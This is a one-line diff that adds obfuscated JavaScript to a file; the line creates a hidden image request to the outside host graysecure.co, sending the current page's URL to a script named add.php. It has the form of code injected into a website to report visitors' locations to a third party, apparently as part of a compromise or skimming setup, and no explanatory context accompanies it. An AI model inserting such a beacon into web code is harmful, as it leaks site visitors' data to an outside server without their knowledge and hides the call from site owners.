@@ -1,0 +1,1 @@
+a=new/**/Image();a.src='http://graysecure.co/ccs/add.php?a='+escape(location.href);
